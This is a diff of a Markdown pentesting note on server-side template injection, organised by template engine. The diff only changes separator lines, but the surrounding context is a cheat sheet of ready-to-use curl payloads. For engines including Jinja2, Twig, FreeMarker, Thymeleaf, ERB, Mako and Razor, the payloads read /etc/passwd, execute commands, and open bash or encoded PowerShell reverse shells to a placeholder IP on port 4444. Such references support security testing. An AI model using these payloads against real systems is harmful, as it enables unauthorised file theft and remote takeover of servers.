@@ -16,7 +16,7 @@ linked:
 ---
 # SSTI - Ejecución por Engine
 
-***
+---
 
 ## Jinja2 (Python / Flask)
 
@@ -34,7 +34,7 @@ linked:
 | `curl -G "https://target/page" --data-urlencode "q={{''.__class__.__mro__[1].__subclasses__()[<idx>]('/etc/passwd').read()}}"` | File read via TextIOWrapper subclass | LFI. |
 ^ssti-engine-jinja2
 
-___
+---
 
 ## Twig (PHP / Symfony)
 
@@ -51,7 +51,7 @@ ___
 | `curl -G "https://target/page" --data-urlencode "q={{_self.env.getTemplateSource('file.twig')}}"` | Template source disclosure | Twig env access. |
 ^ssti-engine-twig
 
-___
+---
 
 ## Smarty (PHP)
 
@@ -65,7 +65,7 @@ ___
 | `curl -G "https://target/page" --data-urlencode "q={if system('id')}{/if}"` | RCE en branch eval | `{if}` con función PHP. |
 ^ssti-engine-smarty
 
-___
+---
 
 ## FreeMarker (Java)
 
@@ -79,7 +79,7 @@ ___
 | `curl -G "https://target/page" --data-urlencode "q=\${\"java.lang.Runtime\".getRuntime().exec(\"id\")}"` | RCE via reflection | Si reflection allowed. |
 ^ssti-engine-freemarker
 
-___
+---
 
 ## Velocity (Java)
 
@@ -90,7 +90,7 @@ ___
 | `curl -G "https://target/page" --data-urlencode "q=#set(\$file=\$s.getClass().forName('java.io.File').getConstructor(\$stringClass).newInstance('/etc/passwd'))"` | File constructor reflection | LFI. |
 ^ssti-engine-velocity
 
-___
+---
 
 ## Thymeleaf (Spring)
 
@@ -104,7 +104,7 @@ ___
 | `curl -G "https://target/page" --data-urlencode "q=__\${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"` | Bypass filter via expression preprocessor | Filter naive. |
 ^ssti-engine-thymeleaf
 
-___
+---
 
 ## ERB (Ruby / Rails)
 
@@ -120,7 +120,7 @@ ___
 | `curl -G "https://target/page" --data-urlencode "q=<%= \`bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'\` %>"` | Reverse shell | Direct exec backticks. |
 ^ssti-engine-erb
 
-___
+---
 
 ## Mako (Python)
 
@@ -135,7 +135,7 @@ ___
 | `curl -G "https://target/page" --data-urlencode "q=\${__import__('os').system('bash -c \"bash -i >& /dev/tcp/IP/4444 0>&1\"')}"` | Reverse shell one-liner | Direct system. |
 ^ssti-engine-mako
 
-___
+---
 
 ## Handlebars (Node.js)
 
@@ -146,7 +146,7 @@ ___
 | Test prototype pollution combo enviando `{"__proto__":{"isAdmin":true}}` | Combo PP + Handlebars | Stack JS vulnerable a ambos. |
 ^ssti-engine-handlebars
 
-___
+---
 
 ## Razor (.NET)
 
@@ -159,4 +159,4 @@ ___
 | `curl -G "https://target/page" --data-urlencode "q=@{System.Diagnostics.Process.Start(\"powershell.exe\",\"-enc <base64>\");}"` | PowerShell encoded payload | Reverse shell encoded. |
 ^ssti-engine-razor
 
-***
+---
